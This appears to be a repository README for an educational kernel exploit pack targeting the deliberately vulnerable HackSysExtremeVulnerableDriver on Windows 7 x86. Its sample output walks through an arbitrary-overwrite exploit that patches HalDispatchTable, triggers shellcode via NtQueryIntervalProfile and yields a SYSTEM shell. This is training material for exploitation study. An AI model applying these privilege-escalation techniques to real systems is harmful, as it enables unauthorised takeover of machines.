# HEVD_Kernel_Exploit
---
My _HackSysExtremeVulnerableDriver_ exploits pack for education purposes developed under **Windows 7 x86 SP1**. Obviously does not employ **SMEP** bypasses.



# Working at the moment
---
Out of 11 vulnerabilities placed in HEVD, there are at the moment following exploits implemented:

* Stack Overflow
* Arbitrary Memory Overwrite
* NULL Pointer Dereference

Found to be working stable.


# Example:
---

```
        HackSysExtremeVulnerableDriver
        Local Privilege Escalation exploit's pack'
        Mariusz B. / mgeeky, '17

[+] Found hevd.sys driver's base: 0x94f3f000
[+] Opened HackSysExtremeVulnerableDriver driver's handle.
[?] Kernel shellcode in user-memory at: 0x004061c9 (size: 60 bytes).

--------------------------------
[01] Stack Overflow, IOCTL code: 0x00222003
[02] Arbitrary Memory Overwrite / Write-What-Where, IOCTL code: 0x0022200b
[03] Null Pointer Dereference, IOCTL code: 0x0022202b
[99] Exit.

[..] Select an exploit to launch against HEVD.SYS (or 99 to exit): 2

--------------------------------
[.] Loading ntkrnlpa.exe
[.] Determining HalDispatchTable symbol's offset...
[.] Constructed custom payload capable of restoring overwritten pointer.
[+] `hal!HalDispatchTable+4` is located at: 0x82937404
[+] Arbitrary Overwrite:
        - Where: 0x0x82937404 (hal!HaliQuerySystemInformation)
        - What: 0x0x346580 (address of shellcode in user space memory)

[+] Issuing IOCTL: HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE
[.] Input buffer: 0x0x22fd8c, size: 8 bytes. Output: 0x0
[>] After sending IOCTL. ret: TRUE, last error: 0, written bytes: 0

[.] Invoking overwritten pointer by calling `NtQueryIntervalProfile`
[.] Exploit has been launched without errors.
[.] Exploit success check: Current user: (SYSTEM), expected: (SYSTEM)
[+] Succeeded. Enjoy your SYSTEM! :-)

--------------------------------

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop> whoami
nt authority\system

C:\Users\IEUser\Desktop>
```

